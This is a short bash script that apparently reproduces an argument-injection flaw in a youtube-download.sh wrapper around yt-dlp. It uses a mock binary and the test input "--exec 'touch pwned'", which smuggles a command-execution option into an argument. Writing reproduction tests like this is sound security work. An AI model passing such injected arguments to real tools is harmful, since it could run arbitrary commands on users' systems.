#!/bin/bash
# Reproduction script for argument injection in youtube-download.sh

# Create a modified version of the vulnerable script that uses our mock yt-dlp
# We use sed to replace the absolute path to yt-dlp with our local mock script
sed 's|/opt/homebrew/bin/yt-dlp|./mock_yt_dlp.sh|g' scripts/youtube-download.sh > scripts/vulnerable_script.sh
chmod +x scripts/vulnerable_script.sh

echo "--- Testing Vulnerable Script ---"
# Simulate a malicious input: "--exec 'touch pwned'"
# If vulnerable, mock_yt_dlp.sh will see "--exec" as a separate argument.
./scripts/vulnerable_script.sh "--exec 'touch pwned'"

echo "--- End of Test ---"
